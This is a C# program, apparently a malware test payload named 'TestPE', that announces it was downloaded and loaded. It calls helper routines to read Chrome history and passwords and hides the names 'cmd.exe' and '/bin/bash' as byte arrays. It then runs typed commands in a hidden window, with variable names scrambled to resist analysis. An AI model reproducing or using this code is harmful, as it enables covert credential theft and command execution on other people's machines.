using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Net;

namespace TestPE
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("\n [~] Hello, I was downloaded and loaded Succesfuly.\n");
            Console.WriteLine("\n [~] Create a webclient sample.\n");
            WebClient webClient = new WebClient();

            //Console.WriteLine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));
            //Console.WriteLine(TraverseDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Personal)));
            List<string> list = new List<string>();
            list = ChromeFirefox.GetChromeHistory();
            foreach (string item in list)
            {
                //Console.WriteLine(item);
            }
            ChromeFirefox.chromPasswords();

            Console.Write("[!] Enter something to run : ");
            string idkwhatyet = Console.ReadLine();

            while (!string.IsNullOrEmpty(idkwhatyet))
            {
                Console.WriteLine(hghbfjyfhtdgvdcxrfsxwertcevrtbrytnuygumiuntubyurvtcxrsgesxge(idkwhatyet));
                Console.Write("[!] Enter something to run : ");
                idkwhatyet = Console.ReadLine();
                Console.WriteLine(hghbfjyfhtdgvdcxrfsxwertcevrtbrytnuygumiuntubyurvtcxrsgesxge(idkwhatyet));
            }

            Console.ReadKey();
        }

        public static string hghbfjyfhtdgvdcxrfsxwertcevrtbrytnuygumiuntubyurvtcxrsgesxge(string UBFdsCKumrgfuKzRLAkzWnAjfbQLDxGHJzkf)
        {
            try
            {
                string FeDGuzjZtfxEZBqtSyMXcUYzxEJbjdRWYdsz = "";
                Process JuPzpYXAEudzbMQJsHbLNUaFRESeEeFRDGCA = new Process();

                var ZSZmePjNNvrdgbXVmAWmfBkfZJxsrYWfrssT = "";
                var RVQDHLjCgHveAeyjydkzjyZfaXYKykVqjACZ = youcantseeme(new byte[] { 47, 98, 105, 110, 47, 98, 97, 115, 104 });
                if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                {
                    RVQDHLjCgHveAeyjydkzjyZfaXYKykVqjACZ = youcantseeme(new byte[] { 99, 109, 100, 46, 101, 120, 101 });
                    ZSZmePjNNvrdgbXVmAWmfBkfZJxsrYWfrssT = youcantseeme(new byte[] { 47, 99, 32 });
                }

                JuPzpYXAEudzbMQJsHbLNUaFRESeEeFRDGCA.StartInfo.FileName = RVQDHLjCgHveAeyjydkzjyZfaXYKykVqjACZ;
                JuPzpYXAEudzbMQJsHbLNUaFRESeEeFRDGCA.StartInfo.Arguments = ZSZmePjNNvrdgbXVmAWmfBkfZJxsrYWfrssT + UBFdsCKumrgfuKzRLAkzWnAjfbQLDxGHJzkf;
                JuPzpYXAEudzbMQJsHbLNUaFRESeEeFRDGCA.StartInfo.UseShellExecute = false;
                JuPzpYXAEudzbMQJsHbLNUaFRESeEeFRDGCA.StartInfo.CreateNoWindow = true;
                JuPzpYXAEudzbMQJsHbLNUaFRESeEeFRDGCA.StartInfo.WorkingDirectory = Directory.GetCurrentDirectory();
                JuPzpYXAEudzbMQJsHbLNUaFRESeEeFRDGCA.StartInfo.RedirectStandardError = true;
                JuPzpYXAEudzbMQJsHbLNUaFRESeEeFRDGCA.StartInfo.RedirectStandardOutput = true;
                JuPzpYXAEudzbMQJsHbLNUaFRESeEeFRDGCA.Start();

                FeDGuzjZtfxEZBqtSyMXcUYzxEJbjdRWYdsz += JuPzpYXAEudzbMQJsHbLNUaFRESeEeFRDGCA.StandardOutput.ReadToEnd();

                return FeDGuzjZtfxEZBqtSyMXcUYzxEJbjdRWYdsz;
            }
            catch (Exception LRBYLbGeKpzZpNjeBdBnAauhhkqBBfVGFScf)
            {
                return LRBYLbGeKpzZpNjeBdBnAauhhkqBBfVGFScf.Message.ToString();
            }

        }

        public static string youcantseeme(byte[] byyte)
        {
            string canyouseeme = Encoding.Default.GetString(byyte);
            return canyouseeme;
        }

        public static string TraverseDirectory(string dirPath)
        {
            StringBuilder sb = new StringBuilder();
            try
            {
                foreach (string file in Directory.GetFiles(dirPath))
                {
                    sb.AppendLine(file);
                }

                foreach (string subDir in Directory.GetDirectories(dirPath))
                {
                    sb.Append(TraverseDirectory(subDir));
                }
            }
            catch (UnauthorizedAccessException)
            {
                
            }

            return sb.ToString();
        }

    }
}